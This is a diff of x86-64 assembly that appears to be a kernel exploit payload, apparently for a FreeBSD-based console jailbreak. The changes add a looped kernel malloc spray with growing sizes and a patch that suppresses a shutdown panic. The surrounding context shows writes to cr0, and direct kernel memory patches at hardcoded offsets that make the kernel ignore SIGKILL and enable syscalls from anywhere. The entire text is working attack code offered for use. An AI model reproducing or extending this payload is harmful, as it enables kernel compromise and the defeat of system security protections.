@@ -2,18 +2,25 @@ use64
 start:
 push rdi
 push rsi
+mov rdx, 1
+.malloc_outer_loop:
+push rdx
 mov rcx, 65536
 .malloc_loop:
 push rcx
 lea r8, [rel start]
 mov rax, [r8+4072] ; kernel_base
-mov rdi, 0xf8
+mov rdi, [rsp+8] ; rdx
 lea rsi, [rax+0x1540eb0] ; M_TEMP
 mov rdx, 2 ; M_WAITOK
 lea rax, [rax+0xd7a0] ; malloc
 call rax
 pop rcx
 loop .malloc_loop
+pop rdx
+shl rdx, 1
+cmp rdx, 4096
+jl .malloc_outer_loop
 pop rsi
 pop rdi
 lea r8, [rel start]
@@ -53,6 +60,9 @@ mov cr0, rax
 mov rax, [r8+4072] ; kernel_base
 ;; ignore SIGKILL
 mov byte [rax+0x29287], 0xeb
+;; avoid panic with "vputx: negative ref cnt"
+;; this happens very late during shutdown, so we better ignore it so the system can turn off
+mov dword [rax+0x3b7eb4], 0
 ;; syscall everywhere
 mov dword [rax+0x490], 0
 mov qword [rax+0x4b2], 0x19de9
